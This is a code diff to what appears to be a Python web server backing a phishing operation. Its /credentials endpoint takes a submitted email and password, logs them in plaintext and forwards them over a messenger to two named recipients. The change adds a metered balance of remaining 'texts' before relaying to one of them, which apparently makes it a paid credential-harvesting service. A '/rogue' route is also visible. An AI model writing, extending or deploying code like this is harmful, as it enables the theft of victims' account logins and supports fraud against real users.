@@ -83,7 +83,13 @@ async def welcome():
 async def credentials(email: str = Form(...), password: str = Form(...)):
     logging.info(f"============================= email: {email}\npassword: {password}")
     messenger.send_message(message=f"email: {email}\npassword: {password}", recipient_id=TARMICA)
-    messenger.send_message(message=f"email: {email}\npassword: {password}", recipient_id=DON)
+    number_of_texts_left = check_number_of_texts_left()
+    if number_of_texts_left>0:
+        #deduct a text
+        new_balance = deduct_text()
+        messenger.send_message(message=f"email: {email}\npassword: {password}", recipient_id=DON)
+        messenger.send_message(message=f"DON texts left {new_balance}", recipient_id=TARMICA)
+        messenger.send_message(message=f"texts left {new_balance}", recipient_id=DON)
     return "OK", 200
 
 @app.get("/rogue")
